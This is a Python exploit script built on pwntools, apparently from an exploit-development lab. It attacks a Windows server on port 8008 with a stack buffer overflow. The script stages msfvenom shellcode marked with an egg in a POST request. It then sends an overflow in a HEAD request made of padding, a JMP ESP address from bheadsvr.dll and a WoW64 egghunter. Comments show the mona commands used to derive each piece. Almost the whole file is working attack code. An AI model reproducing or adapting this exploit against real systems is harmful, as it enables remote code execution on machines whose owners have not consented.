#!/usr/bin/python3
from pwn import remote, p32

# !py mona egghunter -wow64
egg = b"w00t" * 2

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode
shellcode =  b""
shellcode += b"\xba\xf1\x4d\xa4\x77\xda\xce\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x31\x31\x56\x13\x83\xc6\x04"
shellcode += b"\x03\x56\xfe\xaf\x51\x8b\xe8\xb2\x9a\x74\xe8"
shellcode += b"\xd2\x13\x91\xd9\xd2\x40\xd1\x49\xe3\x03\xb7"
shellcode += b"\x65\x88\x46\x2c\xfe\xfc\x4e\x43\xb7\x4b\xa9"
shellcode += b"\x6a\x48\xe7\x89\xed\xca\xfa\xdd\xcd\xf3\x34"
shellcode += b"\x10\x0f\x34\x28\xd9\x5d\xed\x26\x4c\x72\x9a"
shellcode += b"\x73\x4d\xf9\xd0\x92\xd5\x1e\xa0\x95\xf4\xb0"
shellcode += b"\xbb\xcf\xd6\x33\x68\x64\x5f\x2c\x6d\x41\x29"
shellcode += b"\xc7\x45\x3d\xa8\x01\x94\xbe\x07\x6c\x19\x4d"
shellcode += b"\x59\xa8\x9d\xae\x2c\xc0\xde\x53\x37\x17\x9d"
shellcode += b"\x8f\xb2\x8c\x05\x5b\x64\x69\xb4\x88\xf3\xfa"
shellcode += b"\xba\x65\x77\xa4\xde\x78\x54\xde\xda\xf1\x5b"
shellcode += b"\x31\x6b\x41\x78\x95\x30\x11\xe1\x8c\x9c\xf4"
shellcode += b"\x1e\xce\x7f\xa8\xba\x84\x6d\xbd\xb6\xc6\xfb"
shellcode += b"\x40\x44\x7d\x49\x42\x56\x7e\xfd\x2b\x67\xf5"
shellcode += b"\x92\x2c\x78\xdc\xd7\xc3\x32\x7d\x71\x4c\x9b"
shellcode += b"\x17\xc0\x11\x1c\xc2\x06\x2c\x9f\xe7\xf6\xcb"
shellcode += b"\xbf\x8d\xf3\x90\x07\x7d\x89\x89\xed\x81\x3e"
shellcode += b"\xa9\x27\xe2\xa1\x39\xab\xcb\x44\xba\x4e\x14"

payload = egg + shellcode

content = b"POST / HTTP/1.1\r\n" + payload

shell = remote("Windows", 8008)
shell.sendline(content)
shell.close()

# !py mona pattern_offset eip
offset = 36
junk = b"A" * offset

# !py mona jmp -r esp -m bheadsvr.dll
jmpesp = p32(0x625012f0)

# !py mona egghunter -wow64
egghunter  = b""
egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42"
egghunter += b"\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3"
egghunter += b"\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4"
egghunter += b"\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7"

payload = junk + jmpesp + egghunter

content = f"HEAD /{payload.hex()} HTTP/1.1".encode()

shell = remote("Windows", 8008)
shell.sendline(content)
